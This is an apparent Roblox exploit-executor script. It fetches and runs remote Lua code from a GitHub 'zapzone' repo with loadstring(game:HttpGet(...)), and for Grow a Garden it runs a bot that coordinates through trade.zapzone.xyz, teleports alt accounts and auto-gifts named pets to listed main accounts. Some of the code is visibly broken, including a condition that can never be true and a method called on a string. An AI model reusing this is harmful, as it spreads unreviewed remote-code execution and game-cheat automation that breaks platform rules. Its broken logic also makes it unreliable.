repeat task.wait() until game:IsLoaded()
repeat task.wait() until game.Players.LocalPlayer

local list = {
  [35789249] = "grow_a_garden",
  [5292947] = "all_star_tower_defense_x",
  [4372130] = "bloxfruits"
}

local target = game.CreatorId
local script = list[target]

if script and not target == 35789249 then
  local url = string.format("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/%s.lua", script)
  loadstring(game:HttpGet(url))()
elseif target == 35789249 then
    repeat task.wait() until game:IsLoaded()
    repeat task.wait() 
        game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game) 
        game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game) 
    until game:GetService("Players").LocalPlayer:GetAttribute('DataFullyLoaded') == true

    print('---------------- Executors ----------------')

    getgenv().MasterConfig = {
        ['Main'] = { 
            ['Lbulwyc6732'] = "Spinosaurus",
            ['Gbnfqoh3122'] = "Ankylosaurus",
            ['Wglbihy6263'] = "Brontosaurus",
            ['Dqwyazr4964'] = "T-rex",
            ['Volrerz8511'] = "Mimic Octopus"
        },
        ['Webhook'] = {
            ['Url'] = ''
        }
    }

    local player = game:GetService("Players")
    local repicatestorage = game:GetService("ReplicatedStorage")
    local dataservices = require(repicatestorage.Modules.DataService)
    local httpservices = game:GetService("HttpService")

    local function interact(path)
        game:GetService("GuiService").SelectedObject = path
        task.wait()
        if game:GetService("GuiService").SelectedObject == path then
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            task.wait()
        end
        game:GetService("GuiService").SelectedObject = nil
    end

    local function ownerPet()
        local pet = {}
        local data = dataservices:GetData().PetsData
        local inventory = data.PetInventory
        if inventory then
            for petId, petInfo in pairs(inventory.Data) do
                for username, target in pairs(getgenv().MasterConfig.Main) do
                    if petInfo.PetType == target then
                        print(petInfo.PetType)
                        return username, target
                    end
                end
            end
        end
        return nil, nil
    end

    local username, target
    local notrejoin 
    task.spawn(function()
        while true do task.wait()
            pcall(function()
                if not username and not target and getgenv().MasterConfig.Main[player.LocalPlayer.Name] then -- check if not have username and target and your is main player
                    for i, v in pairs(getgenv().MasterConfig.Main) do
                        if player.LocalPlayer.Name == i then
                            username = i 
                            target = v
                            print(username, target)
                            break
                        end
                    end
                elseif getgenv().MasterConfig.Main[player.LocalPlayer.Name] and username and target then -- check if main player and username and target
                    local api = request({
                        Url = "https://trade.zapzone.xyz/submit",
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },  
                        Body = httpservices:JSONEncode({
                            ['Username'] = username,
                            ['Target'] = target,
                            ['JobId'] = game.JobId
                        })
                    })
                    while true do wait()
                        if game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification") then
                            interact(game:GetService("Players").LocalPlayer.PlayerGui.Gift_Notification.Frame:FindFirstChild("Gift_Notification").Holder.Frame.Accept)
                        end
                    end
                else
                    while true do task.wait(1)
                        local x, y = ownerPet()
                        if x and y then
                            local api = request({
                                Url = "https://trade.zapzone.xyz/get/"..x,
                                Method = "GET",
                                Headers = {
                                    ["Content-Type"] = "application/json"
                                },  
                            })
                            local result = httpservices:JSONDecode(api.Body)
                            if result.Username then
                                if result.JobId == game.JobId and game.Players:FindFirstChild(x) then
                                    task.wait(5)
                                    while true do task.wait(1)
                                        local toolequip
                                        for _, tool in pairs(player.LocalPlayer.Backpack:GetChildren()) do
                                            if tool:GetAttribute("ItemType") == "Pet" then
                                                local namepet = tool.Name:gsub("%s%[.*", "")
                                                if namepet == y then
                                                    toolequip = tool.Name
                                                end
                                            end
                                        end
                                        if not toolequip then
                                            for _, tool in pairs(player.LocalPlayer.Character:GetChildren()) do
                                                if tool:GetAttribute("ItemType") == "Pet" then
                                                    local namepet = tool.Name:gsub("%s%[.*", "")
                                                    if namepet == y then
                                                        toolequip = tool.Name
                                                    end
                                                end
                                            end
                                        end
                                        if toolequip then
                                            local chr = player.LocalPlayer.Character
                                            local bp = player.LocalPlayer.Backpack
                                            if bp:FindFirstChild(toolequip) then
                                                local tool = bp:FindFirstChild(toolequip)
                                                if tool then
                                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = x.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 6)
                                                    print("Equipping", tool)
                                                    chr.Humanoid:EquipTool(tool)
                                                    task.wait(2)
                                                    local args = {
                                                        "GivePet",
                                                        game:GetService("Players"):WaitForChild(x)
                                                    }
                                                    game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                                end
                                            else
                                                local args = {
                                                    "GivePet",
                                                    game:GetService("Players"):WaitForChild(x)
                                                }
                                                game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                                wait(3)
                                            end
                                        else
                                            task.wait(2)
                                            print("Trade Success")
                                            player.LocalPlayer:Kick("Trade Success!")
                                            game:Shutdown()
                                        end
                                    end
                                else
                                    print("Not In Server! Teleporting...")
                                    print(result.JobId, game.JobId)
                                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, result.JobId, game.Players.LocalPlayer)
                                end
                            else
                                print("Not Found Master Active!")
                            end
                        else
                            print("Not Pet Target!")
                            local url = string.format("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/%s.lua", script)
                            loadstring(game:HttpGet(url))()
                            break
                        end
                    end
                end
            end)
        end
    end)
else
    print('not found scriptName!')
end

